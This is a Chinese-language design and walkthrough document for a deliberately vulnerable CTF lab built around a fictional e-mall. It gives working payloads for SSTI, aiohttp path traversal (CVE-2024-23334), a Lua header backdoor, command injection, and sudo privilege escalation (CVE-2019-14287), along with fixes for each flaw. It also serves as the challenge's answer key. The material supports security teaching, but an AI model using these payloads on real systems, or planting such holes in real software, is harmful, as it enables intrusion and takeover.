# 尼歐計畫 (Project Neo)  — CTF 題目說明文件

---

## 一、題目情境

NEO-MALL 是一間虛構企業「NEO-Corp」的電子商城。對外暴露三個服務：

- IT 系統狀態面板（`/system-status/`）
- 開發測試站（`/dev-portal/`）
- 商城本體（NEO-MALL，含買家 / 賣家 / 管理員）
- 一台「暫時保留」的內部備份 FTP（匿名存取）

故事設定為：NEO-Corp 因系統遷移留下了多個歷史包袱——匿名 FTP 未關閉、Nginx Gateway 留有除錯介面、商城評論功能誤用 Jinja2 渲染、賣家診斷工具有指令注入、容器內 sudo 版本過舊。紅方需要從外部黑箱掃描開始，逐步串接這些弱點，最終取得 root 權限並產出學號專屬的 Flag。

---

## 二、環境架構

```
                 ┌─────────────────────────┐
   外部攻擊者 ───▶│  nginx-gateway (8080)    │  OpenResty
                 │  /system-status/ ─────┐  │
                 │  /dev-portal/    ──┐  │  │
                 │  /api/debug-system │  │  │  ← Lua RCE (X-NEO-DEBUG)
                 │  /            ──┐  │  │  │
                 └─────────────────┼──┼──┼──┘
                                    │  │  │
              ┌─────────────────┐  │  │  │   ┌────────────────────┐
              │ neo-status:80   │◀─┘  │  └──▶│ neo-mall:8080       │
              │ (nginx, 靜態)    │     │      │ aiohttp 商城本體     │
              └─────────────────┘     │      │ - SSTI(評論)         │
                                       │      │ - CVE-2024-23334     │
              ┌─────────────────┐     │      │ - seller/diag 指令注入│
              │ neo-dev:80      │◀────┘      │ - sudo CVE-2019-14287│
              │ (nginx, autoindex)            └────────────────────┘
              └─────────────────┘                     ▲
                                                        │ ./site-b-dev:/site-b-dev:ro
   ┌────────────────────────┐                          │
   │ neo-ftp (21, 匿名)       │── credentials.bak ───────┘ (情報)
   │ server_migration.bak    │
   └────────────────────────┘
```

| 容器 | 角色 | 對外 Port | 說明 |
|---|---|---|---|
| `nginx-gateway` | OpenResty 入口閘道 | 8080 | 反向代理 + `X-NEO-DEBUG` Lua RCE 介面 |
| `neo-status` | 靜態狀態頁 | （經 gateway） | HTML 註解洩漏 debug-system 線索 |
| `neo-dev` | 開發站（autoindex） | （經 gateway） | `deploy_note.txt` 洩漏 follow_symlinks、flag.sh 等情報 |
| `neo-mall` | 商城主程式（aiohttp） | 8081（直連備用） | 主要漏洞集中地 |
| `neo-ftp` | 匿名 FTP | 21, 30000-30009 | `credentials.bak`、`server_migration.bak` |

---

## 三、如何快速部署

需求：Docker + docker compose。

```bash
cd cve-2024-23334-lab
docker compose up -d --build
```

啟動後對外服務：

- `http://<TARGET>:8080` — 主入口（經 nginx-gateway，含商城 + debug-system + status/dev-portal）
- `http://<TARGET>:8081` — neo-mall 內部除錯直連 Port（依 `app.py` 設計，內網/直連可繞過部分權限檢查）
- `ftp://<TARGET>:21`（anonymous/anonymous）

若要重置環境（清除註冊帳號、REVIEWS 等記憶體狀態）：

```bash
docker compose down
docker compose up -d --build
```

> 注意：`users.json` 會在容器內被 `register_api` 動態寫入新註冊帳號，重建容器（或重新 build image）會還原成初始三組帳號（admin / guest / neo_vendor）。

---

## 四、Flag 位置

本題**沒有靜態 Flag 字串**，所有 Flag 皆由 `/root/flag.sh <學號>` 動態產生：

```bash
USER_FLAG = FLAG{ md5("USER_<學號>") }
ROOT_FLAG = ROOT_FLAG{ md5("ROOT_<學號>") }
```

- `USER_FLAG` 寫入 `/home/neo-user/user_flag.txt`（neo-user 權限即可讀取，對應「取得 neo-user shell」里程碑）
- `ROOT_FLAG` 寫入 `/root/root_flag.txt`（僅 root 可讀，對應「完成 sudo 提權」里程碑）

`site-c-mall/config/secret_flag.txt`（透過 CVE-2024-23334 path traversal 讀到）只是**提示**，告訴紅方真正 Flag 要靠 RCE 執行 `flag.sh` 產生，本身不是 Flag。

---

## 五、大致解題流程

### 階段 0：偵察
- `nmap -p 21,8080,8081 -sV $TARGET`
- 匿名登入 FTP（`anonymous/anonymous`），下載 `backup_logs/credentials.bak`、`server_migration.bak`
  - `credentials.bak`：`guest: FCF41657F02F88137A1BCF068A32C0A3`（MD5，破解後得 `guest123`）
  - `server_migration.bak`：洩漏內部資訊
    - Mall 內部除錯 Port 為 8081
    - Flag 由 `/root/flag.sh` 產生
    - 靜態資源在 `/assets-library/`
    - `/site-b-dev/` 被掛載進 mall 容器
    - sudo 版本 1.8.21p2（CVE-2019-14287）
    - **CVE-2024-23334 patch pending，`follow_symlinks` 仍為啟用**

### 階段 1：CVE-2024-23334 任意檔案讀取
- `/assets-library/` 是 aiohttp 靜態路由，`follow_symlinks=True` + 路徑正規化瑕疵，可用 `..%2f` 等方式跳出 `static/` 目錄
- 讀取 `site-c-mall/config/secret_flag.txt`、`server_config.json`（拿到 `admin_token`，目前為情報彩蛋）、甚至 `users.json`（拿到三組帳號雜湊/明文）
- `secret_flag.txt` 提示：真正 Flag 要透過系統偵錯介面執行 `/root/flag.sh`

### 階段 2：guest 登入 → 取得邀請碼
- 用破解出的 `guest/guest123` 登入 `/api/login`
- `/api/user/me` 回傳 guest 的 `invitation_code = INVITE-GUEST-2024`
- 注意：guest 帳號被擋在 `add_product_review`（無法發評論），純粹是「取得邀請碼」的工具帳號

### 階段 3：用邀請碼自行註冊 → SSTI 偷 Seller 帳密
- 用 `INVITE-GUEST-2024` 呼叫 `/api/register`，建立一個一般買家帳號
- 登入該買家帳號，呼叫 `/api/reviews/add`，於 `comment` 欄位塞入 Jinja2 payload：
  ```json
  {"product_id": 1, "comment": "{{ config }}"}
  ```
- 後端 `jinja2.Template(comment).render(config=app_config)` 會把 `app_config`（內含 `VENDOR_CREDENTIALS: neo_vendor / VendorPass8899`）渲染進回應，造成資訊洩漏（SSTI）

### 階段 4：取得 Seller 身份 + 線索拼圖
- 用 `neo_vendor / VendorPass8899` 登入，`role=seller`，可進入 `/seller-portal`
- 同時，`/system-status/`（site-a-status）的 HTML 註解揭露：
  - 內部除錯介面 `/api/debug-system`
  - 需帶 `X-NEO-DEBUG` header，**支援 Lua 腳本**
- `/dev-portal/configs/deploy_note.txt`（site-b-dev）揭露：
  - `/root/flag.sh` 用 sudo 執行、需帶學號參數
  - **sudo < 1.8.28**（CVE-2019-14287，`sudo -u#-1` 可繞過 `!root` 限制）

### 階段 5：Nginx Gateway Lua RCE
```bash
curl -H 'X-NEO-DEBUG: ngx.say(io.popen("id"):read("*a"))' \
  http://$TARGET:8080/api/debug-system
```
取得 nginx-gateway 容器內 shell 等價執行能力（容器層級 RCE，非 mall）。

### 階段 6：以 Gateway 為跳板打 neo-mall 的 `/api/seller/diag`
`seller_diag_api` 對「內網來源」（172./10./192.168./127.0.0.1）放行未授權存取，且存在**指令注入**：

```bash
curl -H 'X-NEO-DEBUG: ngx.say(io.popen(
  "curl -s -X POST http://neo-mall:8080/api/seller/diag -H \"Content-Type: application/json\" -d \"{\\\"command\\\":\\\"whoami\\\"}\""
):read("*a"))' http://$TARGET:8080/api/debug-system
```
（也可不靠 Gateway，直接用 seller/admin 登入態打 `/api/seller/diag`，但若想練習 SSRF/Pivot，走 Gateway 內網路徑更完整。）

### 階段 7：CVE-2019-14287 sudo 提權 + 產生 Flag
neo-mall 容器內 `neo-user` 的 sudoers：
```
neo-user ALL=(ALL, !root) NOPASSWD: /bin/bash, /root/flag.sh
```
利用 `sudo -u#-1` 讓 sudo 將 UID -1 解析為 0（root）：

```bash
# 取得 user_flag（neo-user 權限即可讀）
sudo -u#-1 /bin/bash -c "cat /home/neo-user/user_flag.txt"

# 以 root 身份產生並讀取 root_flag
sudo -u#-1 /root/flag.sh <你的學號>
sudo -u#-1 /bin/bash -c "cat /root/root_flag.txt"
```

整條鏈透過 Gateway Lua RCE → `/api/seller/diag` 串接：

```bash
curl -H 'X-NEO-DEBUG: ngx.say(io.popen(
  "curl -s -X POST http://neo-mall:8080/api/seller/diag -H \"Content-Type: application/json\" -d \"{\\\"command\\\":\\\"sudo -u#-1 /root/flag.sh <學號>\\\"}\""
):read("*a"))' http://$TARGET:8080/api/debug-system
```

---

## 六、針對紅方巧思的制衡設計

1. **`flag.sh` 用 `eval` 處理學號參數**
   - 故意保留指令拼接漏洞，紅方若想用 `flag.sh` 當二次 RCE 工具（例如 `$(reverse_shell)` 當學號）理論上可行，但本題已經到 root，不影響評分；保留此設計是讓「分數識別碼與學號綁定」且增加一個額外可探索的彩蛋，同時提醒出題者：**flag.sh 本身也是攻擊面**，若要嚴格鎖死可改用 `printf '%q'` 或白名單字元過濾學號格式。

2. **`/api/seller/diag` 對內網放行**
   - 防止紅方直接用瀏覽器/工具對 `8081` 的 `/api/seller/diag` 打 unauthenticated request 就跳過整條鏈——因為**非內網**且未登入會被 403。逼迫紅方一定要透過 Gateway（容器內網）或先取得 seller/admin session，避免「猜到 API 路徑直接打」就秒過題。

3. **`REGISTRATION_COOLDOWN`（30 秒 IP 限速）**
   - 防止紅方對 `/api/register` 暴力枚舉邀請碼。邀請碼必須從 guest 帳號（FTP→雜湊破解）正當取得，避免跳過 SSTI 階段。

4. **`get_products` 隱藏 `id=0` 商品**
   - id=0 商品描述提示「請開發人員前往 `/system-status/` 檢查節點健康度」，但商品列表 API 過濾掉它，避免紅方在一般瀏覽商城時太早看到這條線索，需透過 `/api/products/0`（IDOR/BOLA 練習）或原始碼分析才能發現。

5. **guest 帳號被擋在留言功能外**
   - `add_product_review` 明確拒絕 `username == 'guest'`，避免紅方直接用 guest 帳號打 SSTI（跳過「用邀請碼註冊新帳號」這一步），確保邀請碼機制被實際使用到。

6. **`seller_diag_api` 用 `subprocess.communicate(timeout=5)`**
   - 限制單次指令執行 5 秒，避免紅方用該注入點起 reverse shell / 長駐程式拖垮環境，但仍允許短指令鏈式利用（`;`、`&&`、`sudo` 等）。

7. **CVE-2024-23334 僅作「偵察用情報洩漏」，刻意不放真 Flag**
   - 避免紅方一讀到 `secret_flag.txt` 就誤以為已結束，文件內已明確寫「這不是最終 Flag」，引導往 RCE 路線走，控制整體解題長度與分數分配。

8. **sudo 規則 `(ALL, !root)`**
   - 看似阻擋以 root 身份執行，但刻意搭配舊版 sudo（CVE-2019-14287）製造「看起來安全、實際可繞過」的誤導，訓練紅方對 sudo 版本與規則語法的敏感度，而不是隨便給一條 `NOPASSWD: ALL`。

---

## 七、漏洞原理總覽

| # | 漏洞 | 原理 |
|---|---|---|
| 1 | 匿名 FTP 資訊洩漏 | `neo-ftp` 以 `USERS=anonymous|anonymous` 開放匿名存取，`site-d-ftp` 目錄內放置含憑證雜湊與內部架構資訊的備份檔 |
| 2 | MD5 雜湊弱密碼 | `credentials.bak` 內 guest 密碼以未加鹽 MD5 儲存，可線上彩虹表/暴力破解還原為 `guest123` |
| 3 | 邀請碼機制可被合法取得後濫用 | `register_api` 僅檢查邀請碼是否存在於任一使用者，未限制用途/次數，guest 的邀請碼可被任意人用來自我註冊 |
| 4 | **Server-Side Template Injection (SSTI)** | `add_product_review` 對使用者輸入的 `comment` 直接 `jinja2.Template(comment).render(config=app_config)`，未經沙箱即渲染，且把含敏感資料的 `app_config` 傳入渲染上下文，`{{ config }}` 即可洩漏 `VENDOR_CREDENTIALS` |
| 5 | **CVE-2024-23334**（aiohttp static route path traversal） | aiohttp `add_static(..., follow_symlinks=True)` 在特定版本對路徑正規化處理不當，可透過 `../` 跳脫 `static/` 根目錄讀取任意檔案（如 `config/secret_flag.txt`, `config/server_config.json`, `config/users.json`） |
| 6 | Nginx/OpenResty `X-NEO-DEBUG` Lua 動態執行（自訂後門） | Gateway 將 HTTP request header 直接丟入 `loadstring()` 並執行，等同把 Header 內容當程式碼跑，造成 Gateway 容器 RCE |
| 7 | `/api/seller/diag` 指令注入 + IP 白名單繞過 | (a) 對來自 Docker 內網 CIDR 的請求免驗證；(b) 將 `command` 欄位直接丟給 `subprocess.Popen(['/bin/bash','-c', command])`，造成任意指令執行。紅方利用 Gateway 的 Lua RCE 發出內網請求，繞過 (a) 並觸發 (b) |
| 8 | **CVE-2019-14287**（sudo `-u#-1` 提權） | sudo < 1.8.28 在解析 `sudo -u#-1` 時，會將 `-1`（或任何無法對應到使用者名稱的 UID）誤判為 UID `0`，即使 sudoers 規則寫 `(ALL, !root)` 排除 root，仍可透過此手法以 root 身份執行 `/bin/bash` 或 `/root/flag.sh` |
| 9 | `flag.sh` 中 `eval "STUDENT_INPUT=$STUDENT_ID"` | 對學號參數使用 `eval`，若學號內含特殊字元/指令替換語法，可造成二次指令注入（題目中保留作為延伸彩蛋，非主線必要） |

---

## 八、修補方式（給 writeup / 教學用）

| # | 漏洞 | 修補建議 |
|---|---|---|
| 1 | 匿名 FTP | 關閉匿名存取，或移除 FTP 服務；備份檔不應含真實/類真實憑證，應加密或移至內網限制存取的儲存系統 |
| 2 | MD5 弱密碼 | 改用 bcrypt/argon2 + salt 儲存密碼雜湊；定期輪換預設帳密 |
| 3 | 邀請碼濫用 | 邀請碼應綁定一次性使用、有效期限，且註冊時應記錄/限制邀請來源帳號的邀請額度 |
| 4 | SSTI | 使用者輸入絕不可作為 Jinja2 template 字串渲染；若需動態內容，改用 `render_template_string` 搭配沙箱（如 `jinja2.sandbox.ImmutableSandboxedEnvironment`），且絕不將含密鑰/憑證的物件（如 `app_config`）放入渲染 context。最佳做法是評論內容純文字輸出、做 HTML escape，不經過任何 template engine |
| 5 | CVE-2024-23334 | 升級 aiohttp 至 ≥ 3.9.2（修補版本），或將 `follow_symlinks` 設為 `False`，並確保靜態資源目錄不含任何敏感設定檔 |
| 6 | Lua 後門 (`X-NEO-DEBUG`) | 移除此 location block；正式環境禁止任何將 request 內容傳入 `loadstring`/`eval`/`exec` 等動態執行函式的設計。若需偵錯介面，應有獨立驗證（雙因素/內部 VPN）且不接受外部可控字串作為程式碼 |
| 7 | `/api/seller/diag` | (a) 移除「內網來源即放行」的例外，所有請求一律檢查登入態與角色；(b) 移除 `subprocess` 任意指令執行設計，改為預先定義好的白名單診斷指令（enum），由後端組裝固定指令、不接受自由字串；(c) 若必須執行指令，使用 `shlex` 並以參數陣列傳入，禁止 shell 解析 |
| 8 | CVE-2019-14287 | 升級 sudo 至 ≥ 1.8.28；sudoers 規則避免使用 `!root` 這類負向排除語法，改用明確的正向使用者/群組白名單；最小權限原則，避免授予 `/bin/bash` 這類萬用 shell |
| 9 | `flag.sh` 的 `eval` | 移除 `eval`，改用變數直接賦值（`STUDENT_INPUT="$1"`），並對學號格式做嚴格驗證（如 `^[A-Za-z0-9]{8,10}$`） |

---

## 九、檔案結構

```
cve-2024-23334-lab/
├── docker-compose.yml          # 五個服務：gateway, status, dev, mall, ftp
│
├── nginx-gateway/
│   └── nginx.conf              # 反代主入口 + /api/debug-system (Lua RCE 後門)
│
├── site-a-status/               # → 經 gateway /system-status/
│   ├── index.html               # HTML 註解洩漏 X-NEO-DEBUG / debug-system 線索
│   └── nginx.conf
│
├── site-b-dev/                  # → 經 gateway /dev-portal/，且整個目錄被 mount 進 neo-mall: /site-b-dev (唯讀)
│   ├── nginx.conf                # autoindex on，方便紅方瀏覽
│   └── configs/
│       └── deploy_note.txt       # 洩漏：/assets-library follow_symlinks、debug-system、flag.sh、sudo<1.8.28
│
├── site-c-mall/                  # NEO-MALL 主程式 (aiohttp)
│   ├── app.py                    # 所有業務漏洞核心：SSTI / CVE-2024-23334 / seller diag 指令注入 / 權限控制
│   ├── Dockerfile                # 安裝舊版 sudo (CVE-2019-14287)、建立 neo-user、寫入 sudoers
│   ├── flag.sh                   # 動態產生 user_flag / root_flag (含 eval 彩蛋)
│   ├── requirements.txt
│   ├── config/
│   │   ├── secret_flag.txt        # 透過 path traversal 讀取，僅為提示非 Flag
│   │   ├── server_config.json     # admin_token（情報，可作延伸利用）
│   │   └── users.json             # admin / guest / neo_vendor 三組帳密、邀請碼
│   └── static/
│       ├── index.html / login.html / register.html / dashboard.html
│       ├── product.html / cart.html
│       ├── seller_portal.html     # role in [seller, admin] 可進入，含上傳/診斷工具入口
│       ├── admin_panel.html       # role == admin，提示用 /root/flag.sh 取得最終 Flag
│       ├── changelog.html / privacy.html / terms.html / footer.html
│       ├── style.css
│       ├── js/components.js
│       └── uploads/               # seller_upload_api 動態寫入
│
└── site-d-ftp/                    # → neo-ftp 匿名根目錄
    └── backup_logs/
        ├── credentials.bak         # guest 密碼 MD5
        └── server_migration.bak    # 內部架構/版本情報
```

---

## 十、里程碑（有不同的解題手法，這裡是我講解的其中一種步驟）

| 里程碑 | 對應動作 | 建議產物 |
|---|---|---|
| M1 偵察 | FTP 匿名登入、下載 bak、破解 guest 密碼 | guest 帳密 |
| M2 取得邀請碼 | guest 登入 `/api/user/me` | invitation_code |
| M3 SSTI | 註冊買家帳號、`{{ config }}` 評論注入 | neo_vendor 帳密 |
| M4 找到 RCE 入口 | 讀 `/system-status/` 與 `/dev-portal/` 線索 | X-NEO-DEBUG payload |
| M5 Gateway RCE | Lua RCE 執行 `id` | gateway 容器 shell |
| M6 內網 pivot | 透過 Lua 打 `neo-mall:8080/api/seller/diag` | neo-user shell |
| **M7 User Flag** | `cat /home/neo-user/user_flag.txt`（需先跑過 `flag.sh`） | `FLAG{md5(USER_學號)}` |
| M8 sudo 提權 | `sudo -u#-1 ...`（CVE-2019-14287） | root shell |
| **M9 Root Flag** | `sudo -u#-1 /root/flag.sh <學號>` → `cat /root/root_flag.txt` | `ROOT_FLAG{md5(ROOT_學號)}` |

---

*本文件為教學用環境說明，所有配置均為刻意植入的漏洞情境。*
